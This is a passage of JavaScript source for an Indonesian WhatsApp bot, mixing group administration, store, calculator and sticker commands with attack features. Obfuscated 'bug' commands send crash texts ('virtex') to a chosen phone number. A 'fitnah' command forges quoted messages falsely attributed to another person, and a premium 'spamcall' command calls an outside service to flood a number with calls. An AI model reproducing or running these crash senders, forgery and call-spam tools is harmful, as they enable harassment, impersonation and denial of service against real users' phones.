_0x53f4(_0x8fef2d,_0x54a4af){var _0x3e95a3=_0x3e95();return _0x53f4=function(_0x53f4f6,_0x166a49){_0x53f4f6=_0x53f4f6-0xce;var _0x1e5f32=_0x3e95a3[_0x53f4f6];return _0x1e5f32;},_0x53f4(_0x8fef2d,_0x54a4af);}function _0x3e95(){var _0x45df27=['*\x20to\x20@','17367NAhRjl','1432IZHyNY','668470dWjQFa','312SPwGtJ','10NoZrRv','6283834558105@s.whatsapp.net','1410963oijtVD','Syntak\x20Error!\x0a*Contoh:*\x0a','3608541sqsylK','4aPLpLE','@s.whatsapp.net','225moAmQt','sendMessage','OnlyOwner','135049YAIBWC','2184UsAFgR','itu\x20nomor\x20lu\x20sendiri','415968tQtCsH'];_0x3e95=function(){return _0x45df27;};return _0x3e95();}if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x38d798(0xda));conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),conn[_0x38d798(0xd6)](num,{'text':virtex()},{'quoted':virusnya}),conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions('Sukses\x20kirim\x20*'+command+_0x38d798(0xdc)+num['split']('@')[0x0],[num]);
}
break
case 'bug4':{
var _0x4a373b=_0x26fe;(function(_0x24f6df,_0x42903f){var _0x312b89=_0x26fe,_0x486d3c=_0x24f6df();while(!![]){try{var _0x32ed97=parseInt(_0x312b89(0x19f))/0x1*(parseInt(_0x312b89(0x1a2))/0x2)+-parseInt(_0x312b89(0x19d))/0x3*(parseInt(_0x312b89(0x196))/0x4)+parseInt(_0x312b89(0x191))/0x5*(-parseInt(_0x312b89(0x192))/0x6)+parseInt(_0x312b89(0x198))/0x7*(-parseInt(_0x312b89(0x1a1))/0x8)+parseInt(_0x312b89(0x19a))/0x9+parseInt(_0x312b89(0x1a0))/0xa*(-parseInt(_0x312b89(0x195))/0xb)+parseInt(_0x312b89(0x194))/0xc;if(_0x32ed97===_0x42903f)break;else _0x486d3c['push'](_0x486d3c['shift']());}catch(_0x39f667){_0x486d3c['push'](_0x486d3c['shift']());}}}(_0x18e6,0x6480d));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x4a373b(0x19e)+(prefix+command)+_0x4a373b(0x19b));function _0x18e6(){var _0x15951a=['4846504qXNiQN','556tgqsln','5LnhZgA','1902546TfdmYE','@s.whatsapp.net','11328732YkpkEo','11vbmUUU','1076kMmQMq','split','7TqEDQF','itu\x20nomor\x20lu\x20sendiri','4772385rwbWAh','\x20628xxx','sendMessage','2766Tjpouy','Syntak\x20Error!\x0a*Contoh:*\x0a','653ddBdhA','732770YTLJBe'];_0x18e6=function(){return _0x15951a;};return _0x18e6();}function _0x26fe(_0x492640,_0x405183){var _0x18e608=_0x18e6();return _0x26fe=function(_0x26feff,_0x4010f8){_0x26feff=_0x26feff-0x191;var _0x472f44=_0x18e608[_0x26feff];return _0x472f44;},_0x26fe(_0x492640,_0x405183);}var num=q+_0x4a373b(0x193),dev='6283834558105@s.whatsapp.net';if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x4a373b(0x199));await sleep(0xbb8),conn[_0x4a373b(0x19c)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x4a373b(0x19c)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions('Sukses\x20kirim\x20*'+command+'*\x20to\x20@'+num[_0x4a373b(0x197)]('@')[0x0],[num]);
}
break
case 'bug5':{
var _0x43b91c=_0x2f46;function _0x495b(){var _0x1051e8=['itu\x20nomor\x20lu\x20sendiri','64706WpNRlB','@s.whatsapp.net','sendMessage','*\x20to\x20@','Sukses\x20kirim\x20*','1665XMxnaR','OnlyOwner','split','4037VWMSbt','91116ZyPZLs','34QvKAuA','425865HIkrcO','7931646XXepRU','Itu\x20developer\x20gua','5EGnYaC','5264480QVVfsB','16440SwTlSr','7417914mRgZjJ','4FfGjRS'];_0x495b=function(){return _0x1051e8;};return _0x495b();}function _0x2f46(_0x1c7250,_0x2a6498){var _0x495bfa=_0x495b();return _0x2f46=function(_0x2f468a,_0x44903a){_0x2f468a=_0x2f468a-0xe7;var _0x4f126f=_0x495bfa[_0x2f468a];return _0x4f126f;},_0x2f46(_0x1c7250,_0x2a6498);}(function(_0x2f864c,_0x388f1f){var _0x2017e7=_0x2f46,_0x48a739=_0x2f864c();while(!![]){try{var _0x1ebace=-parseInt(_0x2017e7(0xf7))/0x1*(parseInt(_0x2017e7(0xed))/0x2)+-parseInt(_0x2017e7(0xee))/0x3*(parseInt(_0x2017e7(0xf5))/0x4)+parseInt(_0x2017e7(0xf1))/0x5*(parseInt(_0x2017e7(0xef))/0x6)+-parseInt(_0x2017e7(0xf4))/0x7+parseInt(_0x2017e7(0xf3))/0x8*(-parseInt(_0x2017e7(0xe8))/0x9)+-parseInt(_0x2017e7(0xf2))/0xa+-parseInt(_0x2017e7(0xeb))/0xb*(-parseInt(_0x2017e7(0xec))/0xc);if(_0x1ebace===_0x388f1f)break;else _0x48a739['push'](_0x48a739['shift']());}catch(_0x15db8e){_0x48a739['push'](_0x48a739['shift']());}}}(_0x495b,0xdbcc2));if(!isOwner)return reply(mess[_0x43b91c(0xe9)]);if(!q)return reply('Syntak\x20Error!\x0a*Contoh:*\x0a'+(prefix+command)+'\x20628xxx');var num=q+_0x43b91c(0xf8),dev='6283834558105@s.whatsapp.net';if(num==dev)return reply(_0x43b91c(0xf0));if(num==sender)return reply(_0x43b91c(0xf6));await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x43b91c(0xf9)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x43b91c(0xe7)+command+_0x43b91c(0xfa)+num[_0x43b91c(0xea)]('@')[0x0],[num]);
}
break

// GROUP MENU
case 'hidetag':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case 'del':
case 'delete':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break
case 'kick':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}
break
case 'setppgrup': case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
await sleep(2000)
reply('Sukses mengganti foto profile group')
fs.unlinkSync(media)
break
case 'setnamegrup': case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'setdesc': case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
break
case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownloadTT) return reply('tiktokAuto sudah aktif')
DB_Tiktok.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(DB_Tiktok, null, 2))
reply('Successfully Activate tiktokAuto In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownloadTT) return reply('tiktokAuto belum aktif')
DB_Tiktok.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(DB_Tiktok, null, 2))
reply('Successfully Disabling tiktokAuto In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break
case 'promote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break
case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

// STORE MENU
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'click here',
footer: `*list from ${groupName}*`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break
case 'dellist':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: `#hapuslist ${x.key}`
})
}
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'pilih disini',
footer: 'Silahkan pilih list yg mau dihapus',
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
}
break
case 'hapuslist':
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`, [sender])
}
break

// PREMIUM
case 'jadibot': {
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
jadibot(conn, msg, from)
}
break
case 'listjadibot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isGroup) return reply('Gunakan bot di privat chat')
try {
let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await conn.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
conn.sendMessage(from,{text:te,mentions: [y], },{quoted:msg})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'spamcall':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => reply(mess.error.api))
if (data.status == false) {
reply(data.msg)
} else {
reply(data.logs)
}
}
break
case 'addprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#addprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
setUser("±premium", number_one, true)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
}
break
case 'delprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#delprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
setUser("±premium", number_one, false)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
}
break

// CONVERT
case 'sticker': case 'stiker': case 's':
if (isImage || isQuotedImage){
mentions(`@${sender.split('@')[0]}\n𝐓𝐞𝐫𝐝𝐞𝐤𝐭𝐞𝐤𝐬𝐢 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐆𝐚𝐦𝐛𝐚𝐫\n𝐀𝐮𝐭𝐨 𝐂𝐨𝐧𝐯𝐞𝐫𝐭 𝐊𝐞 𝐒𝐭𝐢𝐜𝐤𝐞𝐫`, [sender])
console.log(`@${sender.split('@')[0]} Mengirim Gambar`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./database/${sender.split("@")[0]}.jpeg`)
var sticknya = fs.readFileSync(`./database/${sender.split("@")[0]}.jpeg`)
fs.writeFileSync('getpp.jpeg', sticknya)
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) {reply(error)})
.on('end', function () {conn.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
await sleep(5000)
fs.unlinkSync('./getpp.jpeg')
fs.unlinkSync('./getpp.webp')
fs.unlinkSync(`./database/${sender.split("@")[0]}.jpeg`)
} else {
reply(`Kirim/Reply foto dengan caption ${prefix+command}`)
}
break
case 'toimg':
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./database/${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./database/${sender.split("@")[0]}.webp`)
let buffer2 = `./database/${sender.split("@")[0]}.webp`
var rand1 = 'database/'+getRandom('.webp')
var rand2 = 'database/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Auto Convert!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./database/${sender.split("@")[0]}.webp`)
})
} else {
reply(`Reply sticker dengan pesan ${prefix+command}`)
}
break
case 'npmstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} Username\nContoh: ${prefix+command} hikki-me`)
var pack = q
npmstalk(pack).then(i=>{
reply(`*STALKER-NPM*
name; ${i.name}
versionLatest; ${i.versionLatest}
versionUpdate; ${i.versionUpdate}
latestDependencies; ${i.latestDependencies}
publishDependencies; ${i.publishDependencies}
publishTime; ${i.publishTime}
latestPublishTime; ${i.latestPublishTime}`)
}).catch((err) => {
reply('Terjadi Kesalahan!!\nNama package npm tidak ditemukan')
})
}
break
case 'ffstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} id\nContoh: ${prefix+command} 2023873618`)
var pack = q
stalkff(pack).then(i=>{
if (i.status !== 200) return reply('Terjadi Kesalahan!!\nid ff tidak ditemukan')
reply(`*STALKER FF*
ID: ${i.id}
Nickname: ${i.nickname}`)
})
}
break
case 'mlstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} id|zone\nContoh: ${prefix+command} 106281329|2228`)
var id = q.split('|')[0]
var zon = q.split('|')[1]
if (!id) return reply('ID wajib di isi')
if (!zon) return reply('ZoneID wajib di isi')
stalkml(id, zon).then(i=>{
if (i.status !== 200) return reply('Terjadi Kesalahan!!\nid/zone tidak ditemukan')
reply(`*STALKER ML*
ID: ${id}
Zone: ${zon}
Nickname: ${i.nickname}`)
})
}
break
case 'githubstalk':{
if (!q) return reply(`Kirim perintah ${prefix+command} username\nContoh: ${prefix+command} Lexxy24`)
var user = q
fetchJson('https://api.github.com/users/'+user).then(i=>{
if (i.message) return reply('Terjadi Kesalahan!!\nUsername github tidak ditemukan')
reply(`*STALKER GITHUB*
login: ${i.login}
type: ${i.type}
name: ${i.name}
company: ${i.company}
blog: ${i.blog}
location: ${i.location}
bio: ${i.bio}
public_repos: ${i.public_repos}
public_gists: ${i.public_gists}
followers: ${i.followers}
following: ${i.following}
created_at: ${i.created_at}
updated_at: ${i.updated_at}`)
})
}
break
default:

/*━━━━━━━[ Function Menfess ]━━━━━━━*/

// Function Menfess Auto Bales
// Jangan Lu Edit Lagi Disini
// Buy No enc? Chat Wa
// Wa Guwe : 083834558105

var _0x1a6220=_0x4a33;(function(_0x5b325d,_0xd37330){var _0x15f0df=_0x4a33,_0x17b9a4=_0x5b325d();while(!![]){try{var _0x5034a9=parseInt(_0x15f0df(0x1d3))/0x1*(-parseInt(_0x15f0df(0x1ca))/0x2)+-parseInt(_0x15f0df(0x1d4))/0x3*(parseInt(_0x15f0df(0x1c5))/0x4)+parseInt(_0x15f0df(0x1c7))/0x5*(-parseInt(_0x15f0df(0x1cf))/0x6)+-parseInt(_0x15f0df(0x1d5))/0x7*(parseInt(_0x15f0df(0x1c9))/0x8)+-parseInt(_0x15f0df(0x1cc))/0x9+-parseInt(_0x15f0df(0x1c4))/0xa+parseInt(_0x15f0df(0x1cd))/0xb;if(_0x5034a9===_0xd37330)break;else _0x17b9a4['push'](_0x17b9a4['shift']());}catch(_0x1d82f8){_0x17b9a4['push'](_0x17b9a4['shift']());}}}(_0x351e,0x54a56));function _0x4a33(_0x1e5c04,_0x200f07){var _0x351e1e=_0x351e();return _0x4a33=function(_0x4a33ba,_0x1cdc80){_0x4a33ba=_0x4a33ba-0x1c3;var _0x110a2e=_0x351e1e[_0x4a33ba];return _0x110a2e;},_0x4a33(_0x1e5c04,_0x200f07);}function _0x351e(){var _0x26a0e1=['pesan\x20diteruskan','1103568ZGfugO','sendMessage','message','text','445736reezra','18tskWyb','1168237exHeIM','messages','4186710kRyETk','297452lFwhFR','type','10QPbKSn','teman','16yYTSyk','2wHOPdZ','conversation','2985354kCXAlP','29597029dyJWde'];_0x351e=function(){return _0x26a0e1;};return _0x351e();}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x1a6220(0x1c8),sender)==![])return;if(m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)]==_0x1a6220(0x1cb)||m[_0x1a6220(0x1c3)][0x0]['type']=='extendedTextMessage'){try{var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)];}catch(_0x2d0d82){var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)];}let text_nya_menfes='*ANONYMOUS\x20CHAT*\x0a💬\x20:\x20'+chat_anonymous;conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8),sender),{'text':text_nya_menfes}),conn['sendMessage'](from,{'text':_0x1a6220(0x1ce)},{'quoted':msg});}}

// Bang yg ini knp di enc?
